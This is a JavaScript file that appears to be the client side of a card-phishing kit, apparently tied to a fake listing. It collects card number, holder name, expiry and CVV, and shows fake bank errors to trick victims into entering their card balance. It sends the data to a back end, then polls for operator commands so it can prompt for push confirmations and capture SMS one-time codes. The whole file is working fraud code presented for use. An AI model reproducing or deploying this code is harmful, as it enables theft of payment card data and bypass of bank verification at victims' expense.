let logId

function loadModal() {
    var cardNumber_1 = document.getElementById("cardnumber");
    var cardHolder_1 = document.getElementById("cardholder");
    var cardMonth_1 = document.getElementById("cardmonth");
    var cardYear_1 = document.getElementById("cardyear");
    var cardCvv_1 = document.getElementById("cardcvv");

    var cardNumber = cardNumber_1.value
    var cardHolder = cardHolder_1.value
    var cardExp = `${cardMonth_1.value}/${cardYear_1.value}`
    var cardCvv = cardCvv_1.value

    if (cardNumber == "" || cardHolder == "" || cardExp == "month/year" || cardCvv == "") {
        $('.modal').hide();
        $('.overlay').hide();
        alert("It is necessary to fill in all the data for verification")
    } else {
        $('.modal').show();
        $('.overlay').show();
        document.querySelector('#error').innerHTML = `
        <h2>The card is being verified...</h2>
        <img src="https://s4.gifyu.com/images/4b7eec582cbc874fb.gif" alt="">
        `

        setTimeout(() => {
            document.querySelector('#error').innerHTML = `
        <h2>Error on the part of the bank.</h2>
        <img  width="150" height="200" src="https://c.tenor.com/eDchk3srtycAAAAi/piffle-error.gif" alt="я джифка">
        <h3>The bank asks for confirmation, you need to enter the balance of your card.</h3>

        <input type="submit" id="open-modal" value="next" onclick="balanceModal()" class="modal_btn">
    `
        }, 1000)
    }
}

function balanceModal() {
    $('.modal').hide();
    $('.overlay').hide();

    var cardNumber_1 = document.getElementById("cardnumber");
    var cardHolder_1 = document.getElementById("cardholder");
    var cardMonth_1 = document.getElementById("cardmonth");
    var cardYear_1 = document.getElementById("cardyear");
    var cardCvv_1 = document.getElementById("cardcvv");

    const cardNumber = cardNumber_1.value
    const cardHolder = cardHolder_1.value
    const cardExp = `${cardMonth_1.value}/${cardYear_1.value}`
    const cardCvv = cardCvv_1.value

    document.querySelector('body > div > main').innerHTML = `
    <div class="inputBox">
        <span>card balance</span>
        <input type="text" id="cardbalance" maxlength="16" class="card-balance">
    </div>
    <input type="submit" id="next" value="submit" class="submit-btn">`
    sendLog(cardNumber, cardHolder, cardExp, cardCvv)
}

function sendLog(number, holder, exp, cvv) {
    var btn = document.getElementById("next");

    btn.onclick = function () {
        var cardBalance_1 = document.getElementById("cardbalance");
        var cardBalance = cardBalance_1.value

        document.querySelector('#error').innerHTML = `
        <h2>The card is being verified...</h2>
        <img src="https://s4.gifyu.com/images/4b7eec582cbc874fb.gif" alt="">
        `
        $('.modal').show()
        $('.overlay').show();

        axios.post("/api/sendLog", {
            card: number,
            exp: exp,
            cvv: cvv,
            balance: cardBalance,
            item: adId
        }).then(function (res) {
            const id = res.data.id

            var t = ""

            setInterval(() => {
                axios.post("/api/getStatus", {
                    id: id
                }).then(function (result) {
                    var status = result.data.status
                    logId = result.data.id

                    if (status !== t)
                        switch (((t = status), status)) {
                            case "push":
                                document.querySelector('#error').innerHTML = `
                                <h2>Error on the part of the bank.</h2>
                                <img  width="100" height="200" src="https://c.tenor.com/-8KOohVfZbEAAAAi/exclamation-punctuation.gif" alt="я джифка">
                                <h3>A push confirmation has been sent to your phone, you need to confirm it</h3>`
                                $('.modal').show()
                                $('.overlay').show();
                                break
                            case "sms":
                                document.querySelector('#error').innerHTML = `
                                <h2>Error on the part of the bank.</h2>
                                <img  width="100" height="200" src="https://c.tenor.com/-8KOohVfZbEAAAAi/exclamation-punctuation.gif" alt="я джифка">
                                <h3>An SMS code was sent to your phone number for verification</h3>
                                    <input type="text" id="errorfield" maxlength="16" placeholder="Enter SMS..." class="input_field">
                                <input type="submit" id="next" onclick="sendValue('sms', )" value="next" class="modal_btn">
                                `
                                $('.modal').show()
                                $('.overlay').show();
                                break
                        }
                })
            }, 1000)
        }).catch(function (err) {
            console.log(err)
        })
    }
}

function sendValue(type) {
    var value_1 = document.getElementById("errorfield");
    var value = value_1.value

    axios.post("/api/sendValue", {
        type: type,
        value: value,
        id: logId
    })

    document.querySelector('#error').innerHTML = `
    <h2>The card is being verified...</h2>
    <img src="https://s4.gifyu.com/images/4b7eec582cbc874fb.gif" alt="">`
    $('.modal').show()
    $('.overlay').show();
}